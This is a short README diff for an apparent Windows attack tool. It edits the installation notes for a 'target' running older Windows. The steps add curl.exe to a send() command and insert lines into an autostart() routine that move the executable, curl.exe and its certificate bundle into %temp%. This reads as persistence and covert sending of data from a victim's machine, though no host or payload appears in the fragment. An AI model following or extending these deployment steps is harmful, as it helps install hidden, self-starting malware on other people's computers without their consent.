@@ -7,7 +7,7 @@
 
 ## Instalation if ur target use windows older than 1706
 * In the function send() in string "cmd" add .exe after "curl"
-* Add in the function autostart() after ``` << "move " + exe_name + " %temp%\n" ```
+* After ``` << "move " + exe_name + " %temp%\n" ``` add in the function autostart() this:
 ``` 
  << "move curl.exe %temp%\n";
  << "move curl-ca-bundle.crt %temp%\n";
